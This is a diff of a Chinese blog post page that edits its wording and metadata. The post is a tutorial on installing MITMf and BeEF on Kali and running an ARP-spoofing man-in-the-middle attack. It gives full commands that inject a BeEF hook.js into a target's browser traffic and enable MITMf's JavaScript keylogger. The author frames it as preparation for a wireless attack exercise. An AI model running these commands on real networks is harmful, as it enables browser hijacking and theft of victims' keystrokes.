@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptools libpcap0.8-">
+<meta name="description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptoo">
 <meta name="keywords" content="中间人攻击">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mitmf中间人攻击">
 <meta property="og:url" content="http://nickzhoulin.github.io/2018/09/25/page180925/index.html">
 <meta property="og:site_name" content="Nick&#39; 的博客">
-<meta property="og:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptools libpcap0.8-">
+<meta property="og:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptoo">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-01.png">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-02.png">
@@ -94,10 +94,10 @@
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-05.png">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-06.png">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-07.png">
-<meta property="og:updated_time" content="2018-09-25T14:24:38.100Z">
+<meta property="og:updated_time" content="2018-09-25T14:35:29.639Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mitmf中间人攻击">
-<meta name="twitter:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptools libpcap0.8-">
+<meta name="twitter:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptoo">
 <meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-01.png">
 
 
@@ -350,22 +350,22 @@
       
 
       
-        <p>过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建环境简单模拟一下。</p>
-<p>这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Kali 2.0中已经默认个移除了这个工具，在安装之前，需要先解决它的依赖问题：</p>
+        <p>过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。</p>
+<p>这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</div></pre></td></tr></table></figure>
 <a id="more"></a>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-01.png" alt=""></p>
-<p>依赖安装完成后就可以安装Mitmf了:</p>
+<p>依赖解决后就可以安装Mitmf了:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install mitmf</div></pre></td></tr></table></figure>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-02.png" alt=""></p>
-<p>安装完后还需要安装一给用于兼容的东西twisted,如果系统之前安装过那么先卸载一下，重新安装：</p>
+<p>安装完成后还需要安装一个用于兼容mitmf的东西twisted,如果系统之前安装过那么先卸载一下，重新安装：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip uninstall twisted</div></pre></td></tr></table></figure>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-03.png" alt=""></p>
 <p>下载twisted最新版本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -d https://twistedmatrix.com/Releases/Twisted/18.7/Twisted-18.7.0.tar.bz2</div></pre></td></tr></table></figure>
 <p>使用pip命令进行安装：</p>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-04.png" alt=""></p>
-<p>到此为止可以正常的使用Mitmf了，运行beef来调用beef的hook脚本，之前kali 一直都是自带beef的，刚刚直接运行beef命令发现还没有安装，如果系统里面没有beef的话运行如下命令</p>
+<p>到此为止可以正常的使用Mitmf了，运行beef来调用beef的hook脚本，之前的kali 一直都是自带beef的，刚才直接运行beef命令发现还没有安装，如果系统里面没有beef的话运行如下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install beef     #安装</div><div class="line">cd /usr/share/beef-xss/  #切换到目录</div><div class="line">./beef                   #运行beef</div></pre></td></tr></table></figure>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-05.png" alt=""></p>
 <p>beef默认的账号和密码都为beef,可以在浏览器中查看。</p>
@@ -373,7 +373,7 @@
 <p>下面使用mitmf进行中间人攻击。输入命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.4 --inject --js-url http://192.168.1.4:3000/hook.js</div></pre></td></tr></table></figure>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-07.png" alt=""></p>
-<p>这里有个地方需要注意一下，target是目标ip,我刚刚一开始一直以为是本机ip,攻击没反应，过了几分钟才回过神来。</p>
+<p>这里有个地方需要注意一下，target是目标ip,我刚开始一直以为是本机ip,攻击没反应，过了会儿才回过神来。</p>
 <p>除了注入脚本，mitmf还自带了许多功能，如键盘记录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.5 --jskeylogger</div></pre></td></tr></table></figure>
 <p>网页图片翻转180度</p>
